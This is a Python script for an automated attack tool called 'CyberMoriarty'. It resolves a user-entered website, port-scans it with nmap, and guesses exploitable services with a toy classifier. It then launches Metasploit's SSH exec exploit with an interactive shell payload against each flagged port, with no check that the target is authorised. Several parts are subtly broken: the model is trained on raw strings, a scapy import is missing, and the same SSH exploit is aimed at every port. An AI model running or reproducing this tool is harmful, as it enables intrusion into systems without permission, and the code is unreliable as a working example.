import socket
import requests
import nmap
import pandas as pd
from sklearn.ensemble import RandomForestClassifier
from msfrpc import MsfRpcClient
import numpy as np
from scapy.all import sniff
from sklearn.ensemble import IsolationForest

class ThreatIntelligence:
    def __init__(self):
        self.malicious_ips = ["1.2.3.4", "5.6.7.8", "9.10.11.12"]

    def is_ip_malicious(self, ip_address):
        return ip_address in self.malicious_ips

class CyberMoriarty:
    def __init__(self):
        self.model = RandomForestClassifier()
        self.vulnerabilities = []
        self.exploit_suggestions = []
        self.attack_log = []
        self.target = None
        self.threat_intelligence = ThreatIntelligence()
        self.msfrpc_client = MsfRpcClient('YOUR_METASPLOIT_PASSWORD', ssl=True)
        self.anomaly_model = IsolationForest(contamination=0.1)  # For anomaly detection

    def resolve_ip(self, website):
        try:
            self.target = socket.gethostbyname(website)
            print(f"Real IP address of {website}: {self.target}")
        except socket.gaierror:
            print(f"Error: {website} is not a valid website.")

    def scan_target(self):
        if not self.target:
            print("Target not set.")
            return
        scanner = nmap.PortScanner()
        scanner.scan(self.target, arguments="-p1-1024 -T4")
        for host in scanner.all_hosts():
            for proto in scanner[host].all_protocols():
                lport = scanner[host][proto].keys()
                for port in lport:
                    self.vulnerabilities.append({
                        'host': host,
                        'port': port,
                        'name': scanner[host][proto][port]['name'],
                        'product': scanner[host][proto][port]['product']
                    })

    def suggest_exploits(self):
        dataset = [
            [22, 'ssh', 'OpenSSH_7.6p1 Ubuntu-4ubuntu0.3', 1],
            [80, 'http', 'Apache/2.4.29 (Ubuntu)', 0],
            [443, 'https', 'Apache/2.4.29 (Ubuntu)', 1],
            [3306, 'mysql', 'MySQL 5.7', 1],
            [21, 'ftp', 'vsFTPd 3.0.3', 1],
            [23, 'telnet', 'default', 1],
            [25, 'smtp', 'Postfix 3.3.0', 0],
            [110, 'pop3', 'Dovecot 2.3.4', 1],
            [8080, 'http-proxy', 'Squid 4.6', 1],
            [1433, 'mssql', 'Microsoft SQL Server 2017', 1]
        ]
        df = pd.DataFrame(dataset, columns=['port', 'service', 'version', 'known_exploit'])
        X = df[['port', 'service', 'version']]
        y = df['known_exploit']
        self.model.fit(X, y)

        if self.vulnerabilities:
            for vulnerability in self.vulnerabilities:
                port = vulnerability['port']
                service = vulnerability['name']
                version = vulnerability['product']
                exploit_suggestion = self.model.predict([[port, service, version]])[0]
                self.exploit_suggestions.append({
                    'port': port,
                    'service': service,
                    'version': version,
                    'exploit_suggestion': exploit_suggestion
                })

        # Anomaly detection part
        network_data = self.collect_network_data().to_numpy()
        anomalies = self.detect_anomalies(network_data)
        if np.any(anomalies == -1):  # -1 indicates anomaly
            for anomaly in anomalies:
                # Treat each anomaly as a potential unknown exploit vector
                self.exploit_suggestions.append({
                    'port': None,
                    'service': 'Unknown',
                    'version': 'Unknown',
                    'exploit_suggestion': 1  # Treat as a high-risk suggestion
                })

    def execute_attack(self):
        for suggestion in self.exploit_suggestions:
            if suggestion['exploit_suggestion']:
                # Here we use Metasploit to execute the attack
                exploit = self.msfrpc_client.modules.use('exploit', 'unix/ssh/sshexec')
                exploit['RHOSTS'] = self.target
                exploit['RPORT'] = suggestion['port']
                exploit['USERNAME'] = 'username'  # Replace with valid username
                exploit['PASSWORD'] = 'password'  # Replace with valid password
                payload = self.msfrpc_client.modules.use('payload', 'cmd/unix/interact')
                exploit.execute(payload=payload)
                
                self.attack_log.append({
                    'port': suggestion['port'],
                    'service': suggestion['service'],
                    'status': 'Attack executed'
                })
                print(f"Attack executed on {suggestion['service']}:{suggestion['port']}")
            else:
                self.attack_log.append({
                    'port': suggestion['port'],
                    'service': suggestion['service'],
                    'status': 'No known exploit'
                })

    def generate_report(self):
        report = "Cybersecurity Report\n"
        report += "====================\n\n"
        report += "Target: {}\n\n".format(self.target)
        report += "Vulnerabilities:\n"
        for vulnerability in self.vulnerabilities:
            report += "{}:{} - {}\n".format(vulnerability['host'], vulnerability['port'], vulnerability['name'])
        report += "\nExploit Suggestions:\n"
        for suggestion in self.exploit_suggestions:
            report += "{}:{} - {} - Suggested Exploit: {}\n".format(suggestion['port'], suggestion['service'], suggestion['version'], suggestion['exploit_suggestion'])
        report += "\nAttack Log:\n"
        for log in self.attack_log:
            report += "{}:{} - {}\n".format(log['port'], log['service'], log['status'])
        with open("cybersecurity_report.txt", "w") as f:
            f.write(report)
        print("Cybersecurity report generated: cybersecurity_report.txt")

    def collect_network_data(self, packet_count=100):
        def packet_to_row(packet):
            return {
                'src': packet[IP].src,
                'dst': packet[IP].dst,
                'proto': packet[IP].proto,
                'len': len(packet),
                'ttl': packet[IP].ttl
            }

        packets = sniff(count=packet_count, filter="ip", prn=packet_to_row)
        df = pd.DataFrame(packets)
        return df

    def detect_anomalies(self, data):
        # Train the anomaly detection model on the network traffic data
        self.anomaly_model.fit(data)
        anomalies = self.anomaly_model.predict(data)
        return anomalies

if __name__ == "__main__":
    tool = CyberMoriarty()
    target_website = input("Enter the target website: ")
    tool.resolve_ip(target_website)
    tool.scan_target()
    tool.suggest_exploits()
    tool.execute_attack()
    tool.generate_report()
